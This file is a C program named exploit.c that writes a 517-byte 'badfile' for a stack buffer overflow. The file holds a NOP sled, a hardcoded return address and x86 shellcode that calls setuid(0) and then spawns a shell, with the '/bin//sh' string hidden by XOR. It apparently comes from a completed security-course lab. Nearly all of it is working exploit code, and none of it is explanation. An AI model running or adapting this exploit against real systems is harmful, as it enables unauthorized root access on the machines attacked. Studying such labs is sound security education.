/* exploit.c */

/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[]=
	// setuid(0)
	"\x6a\x17"			/* push $0x17 */
	"\x58"				/* pop %eax */
	"\x31\xdb"			/* xor %ebx, %ebx */
	"\xcd\x80"			/* int $0x80 */
	"\x31\xc0"			/* xorl %eax,%eax */
	"\x50"				/* pushl %eax */
	"\xb9\x12\x34\x56\x78"		/* mov ecx, 0x78563412 */
	"\xbb\x3d\x1b\x25\x10"		/* mov ebx, 0x10251b3d */
	"\x31\xcb"			/* xor ebx, ecx */
	"\x53"				/* push ebx */
	"\xbb\x3d\x56\x3f\x16"		/* mov ebx, 0x163f563d */
	"\x31\xcb"			/* xor ebx, ecx */
	"\x53"				/* push ebx */
	"\x89\xe3"			/* movl %esp,%ebx */
	"\x50"				/* pushl %eax */
	"\x53"				/* pushl %ebx */
	"\x89\xe1"			/* movl %esp,%ecx */
	"\x99"				/* cdql */
	"\xb0\x0b"			/* movb $0x0b,%al */
	"\xcd\x80"			/* int $0x80 */
;

void main(int argc, char **argv)
{
	char buffer[517];
	FILE *badfile;

	/* Initialize buffer with 0x90 (NOP instruction) */
	memset(&buffer, 0x90, 517);

	/* You need to fill the buffer with appropriate contents here */
	long buffer_address = 0xbfffee04;
	long malicious_address = buffer_address + 100;
	long *ptr = (long *)(buffer + 24);
	*ptr = malicious_address;
	memcpy(buffer + sizeof(buffer) - sizeof(shellcode), shellcode, sizeof(shellcode));

	/* Save the contents to the file "badfile" */
	badfile = fopen("./badfile", "w");
	fwrite(buffer, 517, 1, badfile);
	fclose(badfile);
}

